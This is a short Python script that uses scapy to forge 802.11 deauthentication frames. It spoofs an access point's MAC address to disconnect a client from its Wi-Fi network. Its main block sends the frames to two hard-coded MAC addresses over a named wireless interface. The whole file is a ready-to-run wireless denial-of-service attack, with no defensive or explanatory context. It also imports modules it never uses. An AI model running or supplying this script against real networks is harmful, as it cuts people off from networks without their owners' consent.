from scapy.all import *
import warnings
from cryptography.utils import CryptographyDeprecationWarning
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11


def deauth_test1(client_mac: str,
                 access_point_mac: str,
                 count: int = 3,
                 interface: str = "wlp0s20f3"):
    pkt: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    return sendp(pkt, iface=interface, count=int(count), inter=0.2)


def deauth_test2(client_mac: str,
                 access_point_mac: str,
                 count: int = 3,
                 interface: str = "wlp0s20f3"):
    pkt: Any = Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    return sendp(pkt, iface=interface, count=int(count), inter=0.2)


if __name__ == "__main__":
    # pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    deauth_test1("18:F0:E4:1F:B2:84", 'F6:8C:EB:27:6C:AA')
